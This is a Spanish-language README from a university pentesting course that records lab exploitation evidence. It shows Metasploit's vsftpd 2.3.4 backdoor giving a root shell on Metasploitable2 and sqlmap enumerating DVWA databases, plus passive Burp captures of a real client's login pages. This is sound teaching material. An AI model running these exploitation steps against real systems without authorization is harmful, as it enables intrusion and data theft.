# Sprint 3 - Evidencias de Explotación

Repositorio de evidencias del **Sprint 3** para el curso  
**"Anti Hacking y Nuevas Tendencias de Seguridad" (UPC)**.

## 1. Objetivo del Sprint

Documentar la fase de **explotación** sobre los entornos configurados:

- Kali Linux (atacante)
- Metasploitable 2 (víctima)
- Aplicaciones vulnerables (DVWA, WordPress/Triphasik, etc. según el caso)

Se registran **todos los comandos ejecutados** y **capturas de pantalla** que evidencian:
- Configuración de red
- Detección de servicios/puertos
- Explotación de vulnerabilidades
- Acceso obtenido (credenciales/shell/etc. según el alcance definido por el profesor)

## 2. Estructura de carpetas

```text
evidencias/
├── FASE A — EXPLOTACIÓN EN METASPLOITABLE2 (PoC CRÍTICA).txt
├── kali_ifconfig.txt
├── kali_ip addr.txt
├── metasploitable_ip addr.txt
├── metasploitable_ipconfig.txt
├── dvwa_login
├── triphasik_app_login
├── triphasik_wp_login
└── Screenshot/
    ├── Captura de pantalla 2025-12-05 014610.png
    ├── Captura de pantalla 2025-12-05 015147.png
    ├── ...

```
El srpinte 3 se debide en 3 fases:

* **Fase A – Laboratorio (Metasploitable2 + Metasploit)** → PoC crítica.
* **Fase B – Laboratorio Web (DVWA + Burp + sqlmap)** → PoC SQLi segura.
* **Fase C – Cliente real (Triphasik + Burp)** → pruebas controladas con los dos links.


> Metasploitable2 es una VM **intencionalmente vulnerable** para practicar pentesting con Kali en un entorno aislado, justo lo que estás usando. ([Rapid7 Docs][1])
> sqlmap y herramientas similares se deben usar **solo** en sistemas propios o con permiso explícito (como tu lab y tu cliente en el curso). ([Medium][2])
> Burp Suite funciona como proxy local en `127.0.0.1:8080` para interceptar tráfico HTTP/HTTPS del navegador. ([PortSwigger][3])



## 3. Preparación general 

**En Kali:**

```bash
mkdir -p ~/evidencias_sprint3
```


## FASE A – EXPLOTACIÓN EN METASPLOITABLE2 (PoC CRÍTICA)

antes de inicar se ha hecho en kali como en metaexplotable3:
```bash
ifconfig
 # and
ip addr show 
```
 *Confirmacion de la ejecucion de los comandos*: 

![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 014610.png>)
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 015147.png>)
captura mostrando puertos y versiones, especialmente ademas que se como evidencia los resultados en un txt:

despues ya obtienes los IPs:

* Metasploitable2 → `10.0.2.7`
* Kali → `10.0.2.5`

### A1. Verificar conectividad (Kali → Metasploitable2)

**En Kali:**

```bash
ping -c 4 10.0.2.7
```
### A2. Descubrir servicios con Nmap

**En Kali:**

```bash
nmap -sV 10.0.2.7
```


**S3-A01_ping and A02_nmap**:
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 025325.png>)

 captura donde se vea comando + 4 replies + estadísticas.ademas, captura mostrando puertos y versiones, especialmente

  * `21/tcp open  ftp   vsftpd 2.3.4`
* Esto justifica el exploit de vsftpd.

### A3. Explotación con Metasploit (vsftpd 2.3.4)

**1) Abrir Metasploit**

```bash
msfconsole
```



**2) Buscar el exploit**

En `msfconsole`:

```text
search vsftpd 2.3.4
```

**S3-A04_search_vsftpd and A03_msfconsole**: 
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 025351.png>)
se debe ver `exploit/unix/ftp/vsftpd_234_backdoor`.Ademas, pantalla con el prompt `msf6 >`.

**3) Cargar módulo y ver opciones**

```text
use exploit/unix/ftp/vsftpd_234_backdoor
show options
```

**4) Configurar objetivo**

```text
set RHOSTS 10.0.2.7
show options
```

**S3-A06_show_options_rhosts and A05_show_options_inicial**:
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 025606.png>)
 `RHOSTS  10.0.2.7`. Ademas, `RHOSTS` aún vacío.

**5) Ejecutar exploit**

```text
run
# o
exploit
```

* Si todo va bien, verás algo tipo `Command shell session X opened`.



**6) Validar control de la máquina**

Ahora estás en la shell de la víctima (Metasploitable2):

```text
whoami
id
uname -a
```

**7) Cerrar sesión limpia**

```text
exit   # cierra shell de la víctima
exit   # desde msfconsole, si quieres salir de MSF
```

**S3-A07_exploit_ok, A09_exit and A08_shell_root** .
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 030020.png>)
 log de ejecución donde se vea que abrió una shell. Ademas, salida mostrando:

  * `whoami` → `root`
  * `id` → `uid=0(root) gid=0(root)...`
  * `uname -a` → datos del kernel.

> Esto lo documentas en el informe como **PoC crítica** en entorno de laboratorio: “compromiso total del host Metasploitable2 explotando vsftpd 2.3.4”.


## FASE B – LABORATORIO WEB (DVWA + BURP + SQLMAP)

Aquí demuestras explotación **web** pero solo en entorno vulnerable (DVWA de Metasploitable2).

### B1. Ver que DVWA responde

**En el navegador de Kali (sin proxy aún si quieres):**

Navega a:

```text
http://10.0.2.7
```

* Verás el índice de Metasploitable2 con links (DVWA, Mutillidae, etc.).

**S3-B01_index_metasploitable**: 
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 030321.png>)
captura de la página principal.

Luego:

```text
http://10.0.2.7/dvwa
```

**S3-B02_dvwa_login**: 
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 030420.png>)
pantalla de login de DVWA.

### B2. Configurar Burp como proxy

**1) Abrir Burp Suite** en Kali.

**2) Verificar listener:**

* `Proxy` → `Options` → `Proxy Listeners`.

* Debe haber un listener `127.0.0.1:8080` activo. ([PortSwigger][3])

**S3-B03_burp_listener**.
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 030933-1.png>)

**3) Configurar navegador:**

* Opciones → Network/Conexión → Configuración.

* **Manual proxy**:

  * HTTP Proxy: `127.0.0.1`
  * Puerto: `8080`
  * Marcar “Usar este proxy también para HTTPS”.

**S3-B04_browser_proxy**.
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 031221.png>)

**4) Activar intercept en Burp:**

* `Proxy` → `Intercept` → botón en **“Intercept is on”**.

**S3-B05_intercept_on**.
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 031221-b.png>)

### B3. Capturar login de DVWA y guardar request (para sqlmap)

1. En el navegador (con proxy):

   ```text
   http://10.0.2.7/dvwa
   ```

2. Haz login con las credenciales de DVWA (por defecto suelen ser `admin` / `password` si ya está configurado).

3. Burp debe interceptar un `POST` a `/dvwa/login.php` o similar.

**S3-B06_dvwa_request_intercept**: 
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 031443.png>)
pantalla de `Intercept` mostrando la request de login.

1. En esa request:

   * Click derecho → **Send to Repeater**.
   * Click derecho → **Save item…** y guarda como:

     ```text
     ~/evidencias_sprint3/dvwa_login.txt
     ```
### B4. Ejecutar sqlmap contra DVWA (solo laboratorio)

⚠️ Recuerda: sqlmap es para sistemas propios o con permiso (tu lab lo es). ([Medium][2])

**En Kali, en la carpeta de evidencias:**

```bash
cd ~/evidencias_sprint3
ls
# verifica que está dvwa_login.txt
```

**Escaneo básico, poco agresivo:**

```bash
sqlmap -r dvwa_login.txt --batch --risk=1 --level=1
```

* Observa la salida: si detecta SQLi, lo dirá (ej. “parameter X appears to be injectable”).

**Demostración de impacto solo en DVWA (si detecta algo):**

```bash
sqlmap -r dvwa_login.txt --batch --risk=1 --level=1 --dbs
```

* Aquí mostrará nombres de bases de datos del entorno DVWA (por ejemplo `dvwa`, `information_schema`).

**S3-B07_burp_repeater_dvwa, B08_guardar_dvwa_login_txt, B09_ls_dvwa_login, B11_sqlmap_dbs and B10_sqlmap_basic**: 
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 031903.png>)
se ve la request en Repeater. Ademas, diálogo de guardado (opcional).Igualmente se vea el archivo `dvwa_login.txt`. Finalmente se vea el comando y parte de la salida (detección o “no injection”). Incluyendo salida listando DBs.

> En el informe: esto será la PoC de que **una SQLi permite enumerar bases de datos** en un entorno vulnerable controlado.

---

## FASE C – TRIPHASIK (PRUEBAS CONTROLADAS CON BURP)

Ahora sí entran tus URLs reales:

* `https://app.triphasikperformance.com/login`
* `https://triphasikperformance.com/wp-login.php`

Triphasik Performance es una plataforma real de rendimiento deportivo / coaching (no un CTF). ([Triphasic Training][4])

Aquí **solo** se hace:

* Captura y análisis de requests/responses.
* Sin sqlmap ni brute-force desde esta guía.

### C1. Mantener Burp y proxy configurados

* Reutiliza la config de la Fase B:

  * Proxy del navegador apuntando a `127.0.0.1:8080`.
  * Burp con listener activo.
  * `Intercept is on` para capturar las primeras peticiones.

### C2. Capturar login de `app.triphasikperformance.com`

1. En el navegador:

   ```text
   https://app.triphasikperformance.com/login
   ```

2. Si el acuerdo y tus credenciales lo permiten:

   * Haz un login **normal** (sin payloads raros, solo flujo legítimo).

3. En Burp, en `Intercept`, verás la request a `/login` de `app.triphasikperformance.com`.


4. En Burp:

   * Click derecho → **Send to Repeater**.
   * Click derecho → **Save item…** como:

     ```text
     ~/evidencias_sprint3/triphasik_app_login.txt
     ```

5. En Repeater:

   * Haz 1–2 veces “Send” para repetir la request **sin modificarla**, para ver:

     * Código HTTP (200, 302, etc.).
     * Cabeceras (`Set-Cookie`, etc.).

**S3-C01_triphasik_app_login_page, C02_triphasik_app_request_intercept, C03_triphasik_app_repeater, C04_guardar_triphasik_app_login_txt and C05_triphasik_app_response**: 
![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 033511.png>)

screenshot de la página de login (tapa datos sensibles).y request capturada.Ademas, request en Repeater.finalmente, la respuesta mostrando cabeceras y estado.

> En el informe esto lo describes como análisis de:
>
> * Estructura de autenticación.
> * Cookies de sesión.
> * Comportamiento frente a credenciales correctas/incorrectas (sin ataques).

### C3. Capturar login de `wp-login.php` (WordPress)

1. En el navegador:

   ```text
   https://triphasikperformance.com/wp-login.php
   ```

2. De nuevo, máximo un login legítimo si está dentro del acuerdo (nada de bruteforce).

3. Burp interceptará las requests relacionadas con `/wp-login.php`.



4. En Burp:

   * Click derecho → **Send to Repeater**.
   * Click derecho → **Save item…** como:

     ```text
     ~/evidencias_sprint3/triphasik_wp_login.txt
     ```

5. En Repeater:

   * Reenvía la request tal cual y revisa:

     * Códigos de estado.
     * Cabeceras de seguridad (cookies, `X-Frame-Options`, etc., si quieres comentarlas en el informe).


**S3-C06_triphasik_wp_login_page, S3-C07_triphasik_wp_request_intercept, S3-C08_triphasik_wp_repeater, S3-C09_guardar_triphasik_wp_login_txt and S3-C10_triphasik_wp_response**: 
  ![alt text](<evidencias/Screenshot/Captura de pantalla 2025-12-05 034627.png>)
   formulario de login de WordPress. Ademas, primera request interceptada.

> En el informe lo describes como **evaluación pasiva y controlada del panel admin de WordPress**, sin explotación automatizada (ni sqlmap ni fuerza bruta).

**Resumen de resultados**

   * Qué se explotó de verdad (solo el metaexplotable).
   * Qué se revisó en Triphasik (estructura, comportamiento, posibles riesgos) sin romper nada.

[1]: https://docs.rapid7.com/metasploit/metasploitable-2/?utm_source=chatgpt.com "Metasploitable 2"
[2]: https://medium.com/%401200km/sqlmap-a-deep-dive-into-automated-sql-injection-testing-part-2-advanced-custom-setup-0136ac6ffe53?utm_source=chatgpt.com "SQLMap: A Deep Dive into Automated SQL Injection ..."
[3]: https://portswigger.net/burp/documentation/desktop/settings/tools/proxy?utm_source=chatgpt.com "Proxy settings"
[4]: https://triphasictraining.com/?utm_source=chatgpt.com "TriPhasic Training | Dramatically increase your speed, power ..."
